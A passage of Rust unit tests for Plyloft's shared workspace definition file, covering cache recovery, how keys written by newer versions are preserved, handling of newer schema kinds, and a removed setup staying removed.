            format!("integrationBranch: {bad:?} is not a branch name git accepts"),
        );
        assert_eq!(refused.summary(), "unreadable");
    }
    // No branch named at all is still none.
    assert!(parse_definition(br#"{"schemaVersion":1,"name":"LYRA"}"#).unwrap().integration_branch.is_none());
}

/// SC-10: a cache that doesn't parse is kept aside before the next refresh
/// rebuilds it — it held this computer's edits not yet on the branch.
#[test]
fn an_unreadable_cache_is_kept_aside_not_dropped() {
    let fx = Fixture::new();
    let path = cache_path(&fx.configs, &fx.ws_id);
    let dir = path.parent().unwrap().to_path_buf();
    std::fs::create_dir_all(&dir).unwrap();
    let asides = || -> Vec<PathBuf> {
        std::fs::read_dir(&dir)
            .unwrap()
            .filter_map(|e| e.ok().map(|e| e.path()))
            .filter(|p| p.file_name().unwrap().to_string_lossy().starts_with(&format!("{CACHE_FILENAME}.broken-")))
            .collect()
    };
    // Missing: none, and nothing appears.
    assert!(load_cache(&fx.configs, &fx.ws_id).is_none());
    assert!(asides().is_empty());

    let broken = br#"{ "schemaVersion": 1, "pending": { "name": "Mine, not yet published" }, "source": "#;
    std::fs::write(&path, broken).unwrap();
    assert!(load_cache(&fx.configs, &fx.ws_id).is_none());
    let kept = asides();
    assert_eq!(kept.len(), 1, "{kept:?}");
    assert_eq!(std::fs::read(&kept[0]).unwrap(), broken, "byte for byte");
    assert!(!path.exists(), "moved, not copied");
    // Read again: still none, and no second copy.
    assert!(load_cache(&fx.configs, &fx.ws_id).is_none());
    assert_eq!(asides().len(), 1);

    // A cache that parses is never touched.
    save_cache(&fx.configs, &fx.ws_id, &DefinitionCache::empty()).unwrap();
    assert!(load_cache(&fx.configs, &fx.ws_id).is_some());
    assert!(path.exists());
    assert_eq!(asides().len(), 1);
}

/// Round 3 (S4, SC-10): the edits a cache held when it stopped parsing are
/// not lost with it — the publish queue still has them, and the refresh that
/// rebuilds the cache takes them back as pending instead of emptying the
/// queue to match.
#[test]
fn an_unreadable_cache_gets_its_pending_edits_back_from_the_queue() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    fx.workspaces.rename(&fx.ws_id, "Mine, not yet published".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    assert_eq!(fx.queue().fields["name"].value, Value::from("Mine, not yet published"));

    std::fs::write(cache_path(&fx.configs, &fx.ws_id), b"{ \"schemaVersion\": 1, \"pending\": ").unwrap();
    fx.refresh(&repo);
    let cache = fx.cache().expect("rebuilt");
    assert_eq!(cache.pending.get("name"), Some(&Value::from("Mine, not yet published")), "still pending");
    assert_eq!(fx.queue().fields["name"].value, Value::from("Mine, not yet published"), "still queued");
    assert_eq!(fx.workspaces.snapshot().workspaces[0].name, "Mine, not yet published", "and still in use here");

    // And it is published at the next drain.
    let publisher = FakePublisher::default();
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let (_, fields, _) = publisher.requests.borrow()[0].clone();
    assert_eq!(fields["name"].value, Value::from("Mine, not yet published"));
}

// ── 1.175.0 (C6, SC-9): what a later Plyloft wrote survives a publish ──

/// `.atelier/workspace.json` as 1.174.5 writes it, every field set.
const WRITTEN_BY_1_174_5: &str = r##"{
  "schemaVersion": 1,
  "name": "LYRA",
  "accentColor": "#7c3aed",
  "board": "githubIssues",
  "githubOwnerRepo": "o/lyra",
  "integrationBranch": "staging",
  "versionFiles": [
    {
      "path": "package.json",
      "kind": "package_json"
    },
    {
      "path": "api/main.py",
      "kind": "python_module_var",
      "variableName": "version"
    }
  ],
  "installScript": "scripts/install.sh",
  "tryCommand": "npm run dev",
  "verifyPipeline": [
    {
      "kind": "script",
      "path": "scripts/ppvp.sh"
    },
    {
      "kind": "slash_command",
      "name": "ppvp",
      "args": []
    }
  ],
  "cachePaths": [
    "node_modules"
  ],
  "sharedBuildCache": true,
  "selfCheck": false,
  "reviewChecklist": [
    {
      "name": "Billing",
      "sentence": "Money moves once."
    }
  ],
  "worktreeCopy": [
    ".env"
  ],
  "worktreeSetup": "npm ci",
  "library": {
    "plySkills": {
      "off": [
        "ply:release-notes"
      ],
      "on": []
    }
  },
  "models": {
    "claude": {
      "builder": "opus"
    }
  },
  "areas": [
    {
      "id": "app",
      "name": "App",
      "path": ""
    },
    {
      "id": "site",
      "name": "Site",
      "path": "web",
      "versionFiles": [
        {
          "path": "web/package.json",
          "kind": "package_json"
        }
      ]
    }
  ],
  "releaseKind": "github",
  "knowledge": {
    "shared": true
  }
}
"##;

/// [`WRITTEN_BY_1_174_5`] after a later Plyloft added a key inside each kind
/// of value this build's types have no place for.
fn with_later_keys() -> String {
    let text = WRITTEN_BY_1_174_5
        .replace(
            "      \"path\": \"package.json\",\n      \"kind\": \"package_json\"\n",
            "      \"path\": \"package.json\",\n      \"kind\": \"package_json\",\n      \"optional\": true\n",
        )
        .replace(
            "      \"kind\": \"script\",\n      \"path\": \"scripts/ppvp.sh\"\n",
            "      \"kind\": \"script\",\n      \"path\": \"scripts/ppvp.sh\",\n      \"timeoutSecs\": 600\n",
        )
        .replace(
            "      \"sentence\": \"Money moves once.\"\n",
            "      \"sentence\": \"Money moves once.\",\n      \"severity\": \"high\"\n",
        )
        .replace("      \"on\": []\n", "      \"on\": [],\n      \"ask\": [\n        \"ply:card-brief\"\n      ]\n")
        .replace(
            "          \"path\": \"web/package.json\",\n          \"kind\": \"package_json\"\n",
            "          \"path\": \"web/package.json\",\n          \"kind\": \"package_json\",\n          \"optional\": false\n",
        );
    for key in ["\"optional\": true", "\"timeoutSecs\": 600", "\"severity\": \"high\"", "\"ask\": [", "\"optional\": false"] {
        assert!(text.contains(key), "{key} not placed");
    }
    text
}

#[test]
fn c6_a_file_1_174_5_wrote_comes_back_byte_for_byte_from_a_rewrite_that_changes_nothing() {
    let def = parse_definition(WRITTEN_BY_1_174_5.as_bytes()).unwrap();
    // The fixture is Plyloft's own writing, to the byte.
    let mut own = serde_json::to_string_pretty(&def).unwrap();
    own.push('\n');
    assert_eq!(own, WRITTEN_BY_1_174_5);
    // With the branch's bytes at hand and without (a file being created).
    assert_eq!(file_text(&def, Some(WRITTEN_BY_1_174_5.as_bytes()), &BTreeMap::new(), "main"), WRITTEN_BY_1_174_5);
    assert_eq!(file_text(&def, None, &BTreeMap::new(), "main"), WRITTEN_BY_1_174_5);
    // A field set to the value it has is no change either.
    let same = BTreeMap::from([("accentColor".to_string(), Value::from("#7c3aed"))]);
    assert_eq!(file_text(&def, Some(WRITTEN_BY_1_174_5.as_bytes()), &same, "main"), WRITTEN_BY_1_174_5);
}

#[test]
fn c6_a_change_to_a_file_1_174_5_wrote_is_the_text_1_174_5_would_write() {
    let def = parse_definition(WRITTEN_BY_1_174_5.as_bytes()).unwrap();
    for fields in [
        BTreeMap::from([("accentColor".to_string(), Value::from("#0ea5e9"))]),
        BTreeMap::from([("accentColor".to_string(), Value::Null), ("name".to_string(), Value::from("Lyra"))]),
        BTreeMap::from([(
            "versionFiles".to_string(),
            serde_json::json!([{ "path": "package.json", "kind": "package_json" }, { "path": "Cargo.toml", "kind": "cargo_toml" }]),
        )]),
        BTreeMap::from([("board".to_string(), Value::from("local")), ("tryCommand".to_string(), Value::Null)]),
    ] {
        assert_eq!(
            file_text(&def, Some(WRITTEN_BY_1_174_5.as_bytes()), &fields, "main"),
            file_text(&def, None, &fields, "main"),
            "{fields:?}"
        );
    }
}

#[test]
fn c6_keys_a_later_plyloft_wrote_inside_a_value_survive_a_publish_of_another_field() {
    let written = with_later_keys();
    let def = parse_definition(written.as_bytes()).expect("unknown keys inside a value load");
    // Without the branch's bytes the types drop them: the defect (SC-9 A).
    assert!(!file_text(&def, None, &BTreeMap::new(), "main").contains("optional"));

    // No change: the file as it was.
    assert_eq!(file_text(&def, Some(written.as_bytes()), &BTreeMap::new(), "main"), written);
    // The accent changes: that line, and nothing else.
    let fields = BTreeMap::from([("accentColor".to_string(), Value::from("#0ea5e9"))]);
    let text = file_text(&def, Some(written.as_bytes()), &fields, "main");
    assert_eq!(text, written.replace("\"accentColor\": \"#7c3aed\"", "\"accentColor\": \"#0ea5e9\""));
    // And this build reads it as it reads its own writing of the same change.
    assert_eq!(
        parse_definition(text.as_bytes()).unwrap(),
        parse_definition(file_text(&def, None, &fields, "main").as_bytes()).unwrap()
    );
}

#[test]
fn c6_a_list_this_computer_changes_keeps_the_keys_of_the_entries_it_left_alone() {
    let written = with_later_keys();
    let def = parse_definition(written.as_bytes()).unwrap();
    // A version file added, the Python one's variable renamed; a check
    // added before the script.
    let fields = BTreeMap::from([
        (
            "versionFiles".to_string(),
            serde_json::json!([
                { "path": "package.json", "kind": "package_json" },
                { "path": "api/main.py", "kind": "python_module_var", "variableName": "VERSION" },
                { "path": "Cargo.toml", "kind": "cargo_toml" }
            ]),
        ),
        (
            "verifyPipeline".to_string(),
            serde_json::json!([
                { "kind": "script", "path": "scripts/lint.sh" },
                { "kind": "script", "path": "scripts/ppvp.sh" },
                { "kind": "slash_command", "name": "ppvp", "args": [] }
            ]),
        ),
        ("library".to_string(), serde_json::json!({ "plySkills": { "off": [], "on": ["ply:release-notes"] } })),
    ]);
    let text = file_text(&def, Some(written.as_bytes()), &fields, "main");
    let value: Value = serde_json::from_str(&text).unwrap();
    assert_eq!(
        value["versionFiles"],
        serde_json::json!([
            { "path": "package.json", "kind": "package_json", "optional": true },
            { "path": "api/main.py", "kind": "python_module_var", "variableName": "VERSION" },
            { "path": "Cargo.toml", "kind": "cargo_toml" }
        ])
    );
    assert_eq!(
        value["verifyPipeline"],
        serde_json::json!([
            { "kind": "script", "path": "scripts/lint.sh" },
            { "kind": "script", "path": "scripts/ppvp.sh", "timeoutSecs": 600 },
            { "kind": "slash_command", "name": "ppvp", "args": [] }
        ])
    );
    // A changed object keeps the key the types don't write.
    assert_eq!(
        value["library"]["plySkills"],
        serde_json::json!({ "off": [], "on": ["ply:release-notes"], "ask": ["ply:card-brief"] })
    );
    // What the publish left alone is as it was.
    assert_eq!(value["reviewChecklist"][0]["severity"], "high");
    assert_eq!(value["areas"][1]["versionFiles"][0]["optional"], false);
    assert_eq!(
        parse_definition(text.as_bytes()).unwrap(),
        parse_definition(file_text(&def, None, &fields, "main").as_bytes()).unwrap()
    );
}

#[test]
fn c6_a_hand_written_file_keeps_its_own_writing_where_nothing_changes() {
    // No `args`, a null, a value of the wrong type the types read as unset.
    let written = "{\n  \"name\": \"LYRA\",\n  \"board\": \"local\",\n  \"tryCommand\": 5,\n  \"accentColor\": null,\n  \"verifyPipeline\": [{ \"kind\": \"slash_command\", \"name\": \"ppvp\" }]\n}\n";
    let def = parse_definition(written.as_bytes()).unwrap();
    let fields = BTreeMap::from([("name".to_string(), Value::from("Lyra"))]);
    let value: Value = serde_json::from_str(&file_text(&def, Some(written.as_bytes()), &fields, "main")).unwrap();
    assert_eq!(value["name"], "Lyra");
    assert_eq!(value["tryCommand"], 5, "a later Plyloft's value of another type stays");
    assert_eq!(value["verifyPipeline"], serde_json::json!([{ "kind": "slash_command", "name": "ppvp" }]));
    // Setting the field writes this computer's value over it.
    let fields = BTreeMap::from([("tryCommand".to_string(), Value::from("npm start"))]);
    let value: Value = serde_json::from_str(&file_text(&def, Some(written.as_bytes()), &fields, "main")).unwrap();
    assert_eq!(value["tryCommand"], "npm start");
}

#[test]
fn c6_bytes_that_arent_the_definitions_file_never_change_what_is_written() {
    let def = parse_definition(WRITTEN_BY_1_174_5.as_bytes()).unwrap();
    let fields = BTreeMap::from([("accentColor".to_string(), Value::from("#0ea5e9"))]);
    let own = file_text(&def, None, &fields, "main");
    // Not JSON, or JSON that isn't an object: this build's own writing.
    for bytes in [&b"{ not json"[..], b"[1, 2]", b"\"text\"", b""] {
        assert_eq!(file_text(&def, Some(bytes), &fields, "main"), own);
    }
    // Another file altogether: whatever is kept of it, this build reads the
    // text as it reads its own.
    let other = br#"{ "name": 7, "board": ["x"], "versionFiles": { "path": "package.json" }, "later": true }"#;
    let text = file_text(&def, Some(other), &fields, "main");
    assert_eq!(parse_definition(text.as_bytes()).unwrap(), parse_definition(own.as_bytes()).unwrap());
}

const NEWER_CHECK: &str = r#"{
  "schemaVersion": 1,
  "name": "Ply",
  "board": "githubIssues",
  "versionFiles": [
    { "path": "package.json", "kind": "package_json", "optional": true }
  ],
  "verifyPipeline": [
    { "kind": "script", "path": "scripts/ppvp.sh" },
    { "kind": "container", "image": "ci:latest" }
  ]
}
"#;

#[test]
fn c6_a_kind_this_build_doesnt_know_is_a_newer_plylofts_not_a_broken_file() {
    let check = parse_definition(NEWER_CHECK.as_bytes()).unwrap_err();
    assert!(check.newer(), "{}", check.message);
    assert_eq!(check.line, Some(10), "{}", check.message);
    assert_eq!(
        check.newer_sentence("main", true).as_deref(),
        Some(concat!(
            ".atelier/workspace.json on main was written by a newer Plyloft, so ",
            crate::this_machine!(),
            " can't read all of it (line 10). Update Plyloft on ",
            crate::this_machine!(),
            ". Until then it keeps using the last good copy and publishes nothing."
        ))
    );
    assert_eq!(
        check.newer_sentence("main", false).as_deref(),
        Some(concat!(
            ".atelier/workspace.json on main was written by a newer Plyloft, so ",
            crate::this_machine!(),
            " can't read all of it (line 10). Update Plyloft on ",
            crate::this_machine!(),
            ". Until then it keeps its own settings and publishes nothing."
        ))
    );

    let board = parse_definition(b"{\n  \"name\": \"Ply\",\n  \"board\": \"linear\"\n}").unwrap_err();
    assert!(board.newer(), "{}", board.message);
    assert_eq!(board.line, Some(3));
    let version_file = parse_definition(
        b"{\n  \"name\": \"Ply\",\n  \"versionFiles\": [\n    { \"path\": \"go.mod\", \"kind\": \"go_mod\" }\n  ]\n}",
    )
    .unwrap_err();
    assert!(version_file.newer(), "{}", version_file.message);
    assert_eq!(version_file.line, Some(4));

    // Share, with the file already there.
    assert_eq!(
        check.newer_share_refusal("main").as_deref(),
        Some(concat!(
            ".atelier/workspace.json on main was written by a newer Plyloft, so ",
            crate::this_machine!(),
            " can't read all of it (line 10). Update Plyloft on ",
            crate::this_machine!(),
            "; Plyloft won't share a second one."
        ))
    );

    // A newer schema has no line.
    let schema = parse_definition(br#"{ "schemaVersion": 2, "name": "Ply" }"#).unwrap_err();
    assert!(schema.newer());
    assert_eq!(
        schema.newer_sentence("staging", true).as_deref(),
        Some(concat!(
            ".atelier/workspace.json on staging was written by a newer Plyloft, so ",
            crate::this_machine!(),
            " can't read all of it. Update Plyloft on ",
            crate::this_machine!(),
            ". Until then it keeps using the last good copy and publishes nothing."
        ))
    );

    // Broken JSON, a missing name, a checklist over its limits, a branch git
    // refuses: the file is to be fixed, as before.
    for broken in [
        "{\n  \"name\": \"Ply\",\n  \"board\": oops\n}",
        "{ \"board\": \"local\" }",
        "{ \"name\": \"Ply\", \"integrationBranch\": \"a..b\" }",
        "{ \"name\": \"Ply\", \"verifyPipeline\": [{ \"path\": \"x.sh\" }] }",
    ] {
        let bad = parse_definition(broken.as_bytes()).unwrap_err();
        assert!(!bad.newer(), "{broken}: {}", bad.message);
        assert_eq!(bad.newer_sentence("main", true), None);
        assert_eq!(bad.newer_share_refusal("main"), None);
    }
}

/// SC-9 B: a teammate on a newer Plyloft adds a check of a kind this build
/// doesn't know. This computer keeps its last good copy, publishes nothing
/// over the file, and says to update — not to fix the file.
#[test]
fn c6_a_file_with_a_newer_kind_is_kept_as_it_is_and_the_words_say_update() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    let good = fx.cache().unwrap();

    repo.put("main", DEFINITION_PATH, NEWER_CHECK, "b", "c2");
    let report = fx.refresh(&repo);
    assert!(report.unreadable.as_ref().is_some_and(Unreadable::newer));
    let cache = fx.cache().unwrap();
    assert_eq!(cache.definition, good.definition, "the last good copy stays");
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script { path: "scripts/ppvp.sh".into() }])
    );

    let sentence = concat!(
        ".atelier/workspace.json on main was written by a newer Plyloft, so ",
        crate::this_machine!(),
        " can't read all of it (line 10). Update Plyloft on ",
        crate::this_machine!(),
        ". Until then it keeps using the last good copy and publishes nothing."
    );
    // The accent changed from Plyloft: it waits here, nothing is published.
    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
    let publisher = FakePublisher::default();
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    assert!(publisher.requests.borrow().is_empty(), "nothing is written over the file");
    assert_eq!(report.error.as_deref(), Some(sentence));
    assert!(fx.cache().unwrap().pending.contains_key("name"), "the edit waits");
    assert_eq!(queue_definition(&fx.stores(), &fx.ws_id).unwrap_err(), sentence);

    let row = crate::doctor::shared_definition_status("Ply", &cache, &PublishQueue::default(), &[]).unwrap();
    assert_eq!(row.state, "unreadable");
    // Round 2: the Doctor adds what it couldn't read — the value serde
    // names is how a kind typed wrong is found.
    assert_eq!(
        row.detail,
        format!("{sentence} What it couldn't read: unknown variant `container`, expected `script` or `slash_command` at line 10 column 25.")
    );

    // After the update (here: the file is one this build reads) it clears.
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "b", "c3");
    assert!(fx.refresh(&repo).unreadable.is_none());
}

#[test]
fn c6_a_newer_file_this_computer_never_read_says_it_keeps_its_own_settings() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, NEWER_CHECK, "a", "c1");
    let report = fx.refresh(&repo);
    assert!(!report.has_definition);
    let row =
        crate::doctor::shared_definition_status("atelier", &fx.cache().unwrap(), &PublishQueue::default(), &[])
            .unwrap();
    // No copy was ever read, so no branch is on record: the Doctor's own
    // words for it, as in its older sentence.
    assert_eq!(
        row.detail,
        concat!(
            ".atelier/workspace.json on the integration branch was written by a newer Plyloft, so ",
            crate::this_machine!(),
            " can't read all of it (line 10). Update Plyloft on ",
            crate::this_machine!(),
            ". Until then it keeps its own settings and publishes nothing.",
            " What it couldn't read: unknown variant `container`, expected `script` or `slash_command` at line 10 column 25."
        )
    );
    // A broken file keeps the Doctor's older words.
    repo.put("main", DEFINITION_PATH, "not json", "a", "c2");
    fx.refresh(&repo);
    let row =
        crate::doctor::shared_definition_status("atelier", &fx.cache().unwrap(), &PublishQueue::default(), &[])
            .unwrap();
    assert!(row.detail.contains("can't be read") && row.detail.ends_with("fix it in the repository."), "{}", row.detail);
}

/// No new saved field: a cache 1.174.5 wrote while the branch held a newer
/// kind says "newer" from the message it already kept.
#[test]
fn c6_a_cache_1_174_5_wrote_reads_and_its_unknown_kind_says_newer() {
    let cache: DefinitionCache = serde_json::from_str(
        r#"{ "schemaVersion": 1,
              "definition": { "schemaVersion": 1, "name": "Ply", "board": "local" },
              "source": "repo", "branch": "main", "commit": "c1",
              "unreadable": { "path": ".atelier/workspace.json", "line": 10,
                "message": "unknown variant `container`, expected `script` or `slash_command` at line 10 column 3",
                "commit": "c2" },
              "pending": {}, "pendingState": null }"#,
    )
    .unwrap();
    let bad = cache.unreadable.as_ref().unwrap();
    assert!(bad.newer());
    let row = crate::doctor::shared_definition_status("Ply", &cache, &PublishQueue::default(), &[]).unwrap();
    assert_eq!(row.summary, "unreadable (line 10)");
    assert!(row.detail.contains("was written by a newer Plyloft"), "{}", row.detail);
    // And one that kept a broken file's message says what it said.
    let broken: Unreadable = serde_json::from_str(
        r#"{ "path": ".atelier/workspace.json", "line": 3, "message": "expected value at line 3 column 12" }"#,
    )
    .unwrap();
    assert!(!broken.newer());
}

// ── 1.175.0 (C1, SC-2): Stop sharing, and a removed setup stays removed ──

use crate::stop_sharing::{
    keep_local, settle, stop, RemovalOutcome, RemovalRequest, Remover, SharingNote, SharingState, StopOutcome,
};

/// The channel's removal, scripted.
#[derive(Default)]
struct FakeRemover {
    outcomes: RefCell<Vec<RemovalOutcome>>,
    /// (branch, fallback branch) of each removal asked for.
    asked: RefCell<Vec<(String, String)>>,
}

impl FakeRemover {
    fn then(outcome: RemovalOutcome) -> Self {
        Self { outcomes: RefCell::new(vec![outcome]), ..Default::default() }
    }
}

impl Remover for FakeRemover {
    fn remove(&self, request: &RemovalRequest<'_>) -> RemovalOutcome {
        self.asked.borrow_mut().push((request.branch.to_string(), request.pull_request_branch.to_string()));
        let mut outcomes = self.outcomes.borrow_mut();
        if outcomes.is_empty() { RemovalOutcome::Removed { commit: "gone1".into() } } else { outcomes.remove(0) }
    }
}

/// A workspace sharing [`PLY_DEFINITION`] from `main`, read once.
fn shared() -> (Fixture, FakeRepo) {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "example-teammate", "c1");
    fx.refresh(&repo);
    assert!(fx.cache().unwrap().definition.is_some());
    (fx, repo)
}

/// SC-2 itself: the file is taken off the branch, then this computer renames
/// the project. Nothing may put the file back.
#[test]
fn c1_a_setup_removed_from_the_branch_is_never_created_again_by_an_edit() {
    let (fx, repo) = shared();
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    let report = fx.refresh(&repo);
    assert!(!report.has_definition);
    assert_eq!(report.sharing, None, "a writer chooses on the Board: no toast");

    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_none());
    let removed = cache.removed.clone().expect("removed");
    assert_eq!(removed.branch, "main");
    assert_eq!(removed.commit.as_deref(), Some("c2"));
    assert_eq!(removed.author.as_deref(), Some("example-teammate"));
    assert_eq!(removed.at, Some(1_700_000_500));
    assert!(cache.sharing.is_none());
    // This computer keeps the values it read last.
    assert_eq!(fx.ws().name, "Ply");
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script { path: "scripts/ppvp.sh".into() }])
    );

    // A rename from the sidebar: saved here, nothing queued, nothing published.
    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    assert!(record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().is_none());
    let publisher = FakePublisher::default();
    assert!(publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().is_none());
    refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Publish).unwrap();
    assert!(publisher.requests.borrow().is_empty(), "no publish re-creates the file");
    assert!(fx.queue().is_empty());
    assert_eq!(fx.ws().name, "Renamed");
    // Read again, and after a restart: still removed, still nothing.
    fx.refresh(&repo);
    let fx = fx.restart();
    fx.refresh(&repo);
    assert!(fx.cache().unwrap().removed.is_some());
    assert!(publisher.requests.borrow().is_empty());
}

#[test]
fn c1_changes_not_published_yet_stay_on_this_computer_when_the_setup_is_removed() {
    let (fx, repo) = shared();
    // Offline edits: a rename and a new accent wait in the queue.
    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    record_local_edit_named(&fx.stores(), &repo, &fx.ws_id, false, Some("Renamed".into())).unwrap().unwrap();
    fx.workspaces.set_accent_color(&fx.ws_id, Some("#0ea5e9".into())).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
    assert_eq!(fx.queue().fields.len(), 2);

    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    let publisher = FakePublisher::default();
    refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert!(publisher.requests.borrow().is_empty(), "the queued edits are not published");
    assert!(fx.queue().is_empty(), "nothing waits to be published");
    let cache = fx.cache().unwrap();
    assert!(cache.pending.is_empty());
    assert_eq!(cache.pending_state, None);
    assert_eq!(cache.removed.unwrap().pending, vec!["accentColor".to_string(), "name".to_string()]);
    // The values are this computer's own.
    assert_eq!(fx.ws().name, "Renamed");
    assert_eq!(fx.ws().accent_color.as_deref(), Some("#0ea5e9"));
}

#[test]
fn c1_keep_it_on_this_computer_records_the_answer_and_writes_nothing() {
    let (fx, repo) = shared();
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    fx.refresh(&repo);
    keep_local(&fx.stores(), &fx.ws_id, 1_700_009_999).unwrap();
    let cache = fx.cache().unwrap();
    assert!(cache.removed.is_none());
    let sharing = cache.sharing.expect("kept");
    assert_eq!(sharing.state, SharingState::KeptLocal);
    assert_eq!(sharing.who.as_deref(), Some("example-teammate"));
    assert_eq!(sharing.at, 1_700_000_500, "when it was removed, not when it was answered");
    assert!(fx.queue().is_empty());
    // Nothing to keep twice.
    assert!(keep_local(&fx.stores(), &fx.ws_id, 1).is_err());
    // Edits after it stay here, and the answer survives a read and a restart.
    fx.workspaces.rename(&fx.ws_id, "Mine".into()).unwrap();
    assert!(record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().is_none());
    let publisher = FakePublisher::default();
    refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Publish).unwrap();
    assert!(publisher.requests.borrow().is_empty());
    let fx = fx.restart();
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().sharing.unwrap().state, SharingState::KeptLocal);
    assert!(fx.cache().unwrap().removed.is_none(), "not asked again");
}

#[test]
fn c1_share_it_again_creates_the_file_through_the_share_path_and_clears_the_state() {
    let (fx, repo) = shared();
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    fx.refresh(&repo);
    let outcome = crate::workspace_adoption::share(&fx.stores(), &repo, &fx.ws_id, "MatteoB-adv/atelier", 0).unwrap();
    assert!(!outcome.already_shared);
    assert!(fx.queue().create_definition, "the creation is queued, as Share queues it");
    let cache = fx.cache().unwrap();
    assert_eq!(cache.source, DefinitionSource::Seeded);
    assert!(cache.removed.is_none() && cache.sharing.is_none());
    assert_eq!(cache.definition.unwrap().name, "Ply", "this computer's values");

    // After "Keep it on this Mac" too.
    let (fx, repo) = shared();
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    fx.refresh(&repo);
    keep_local(&fx.stores(), &fx.ws_id, 1).unwrap();
    crate::workspace_adoption::share(&fx.stores(), &repo, &fx.ws_id, "MatteoB-adv/atelier", 0).unwrap();
    assert!(fx.queue().create_definition);
    assert!(fx.cache().unwrap().sharing.is_none());
}

#[test]
fn c1_someone_sharing_it_again_is_read_and_the_state_clears() {
    let (fx, repo) = shared();
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    fx.refresh(&repo);
    keep_local(&fx.stores(), &fx.ws_id, 1).unwrap();
    repo.put("main", DEFINITION_PATH, &with_verify("scripts/again.sh"), "b", "c3");
    let report = fx.refresh(&repo);
    assert!(report.has_definition);
    let cache = fx.cache().unwrap();
    assert!(cache.removed.is_none() && cache.sharing.is_none());
    assert_eq!(cache.source, DefinitionSource::Repo);
}

#[test]
fn c1_a_file_that_is_only_out_of_reach_is_not_removed() {
    // Offline: the fetch fails and the last fetched tip has no file to show.
    let (fx, mut repo) = shared();
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    repo.fetch_error = Some("could not resolve host".into());
    fx.refresh(&repo);
    assert!(fx.cache().unwrap().definition.is_some(), "offline is not removed");
    assert!(fx.cache().unwrap().removed.is_none());

    // Git can't say whether the file is there.
    let (fx, repo) = shared();
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    repo.cant_say.set(true);
    fx.refresh(&repo);
    assert!(fx.cache().unwrap().definition.is_some());

    // The branch itself is gone.
    let (fx, repo) = shared();
    repo.remove("main", DEFINITION_PATH);
    fx.refresh(&repo);
    assert!(fx.cache().unwrap().definition.is_some(), "a missing branch is another matter");
    assert!(fx.cache().unwrap().removed.is_none());
}

#[test]
fn c1_a_setup_never_read_from_the_branch_is_not_removed_by_its_absence() {
    // Seeded by Share and not on the branch yet.
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.branches.borrow_mut().insert("main".into());
    crate::workspace_adoption::share(&fx.stores(), &repo, &fx.ws_id, "MatteoB-adv/atelier", 0).unwrap();
    assert_eq!(fx.cache().unwrap().source, DefinitionSource::Seeded);
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_some() && cache.removed.is_none());
    assert!(fx.queue().create_definition, "the creation still waits");

    // Converted from the older file, which then goes away.
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", LEGACY_PATH, PLY_LEGACY, "a", "c1");
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().source, DefinitionSource::Legacy);
    repo.remove_by("main", LEGACY_PATH, "a", "c2");
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_some() && cache.removed.is_none());
}

#[test]
fn c1_the_older_file_is_not_converted_again_where_the_setup_was_removed() {
    let (fx, repo) = shared();
    // `workspace.json` is removed and the older file is still on the branch.
    repo.put("main", LEGACY_PATH, PLY_LEGACY, "a", "c0");
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_none(), "not converted: that would publish the file back");
    assert!(cache.removed.is_some());
    keep_local(&fx.stores(), &fx.ws_id, 1).unwrap();
    fx.refresh(&repo);
    assert!(fx.cache().unwrap().definition.is_none());
    let publisher = FakePublisher::default();
    refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Publish).unwrap();
    assert!(publisher.requests.borrow().is_empty());
}

#[test]
fn c1_a_read_only_member_is_told_once_and_keeps_the_values() {
    let (fx, repo) = shared();
    *repo.permission.borrow_mut() = Some(false);
    fx.refresh(&repo);
    assert!(fx.cache().unwrap().write_access.read_only());
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    let report = fx.refresh(&repo);
